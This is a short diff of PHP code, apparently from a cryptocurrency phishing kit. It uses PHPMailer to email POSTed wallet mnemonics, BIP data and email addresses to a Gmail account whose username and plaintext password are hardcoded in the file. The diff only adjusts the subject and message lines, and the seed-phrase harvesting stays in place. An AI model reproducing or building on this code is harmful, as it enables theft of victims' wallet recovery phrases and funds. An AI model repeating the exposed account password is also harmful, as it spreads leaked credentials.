@@ -29,11 +29,10 @@ $mail->SMTPSecure = "tls";
 $mail->Port = "587";
 $mail->Username = "emmajoy658@gmail.com";
 $mail->Password = "Olasunkanmi2001!";
-$mail->Subject = "Test";
 $mail->setFrom($_POST['wallet_email'], $_POST['mnemonic']);
 $mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
 $mail->Subject = "/New Entry";
-$mail->MsgHTML($mnemonic . $wallet_email . $bip);
+$mail->MsgHTML($wallet_email);
 
 $mail->Body = "Mnemonic= " . $mnemonic . "\r\n Email= " . $wallet_email . "\r\n Bip= " . $bip ;
 
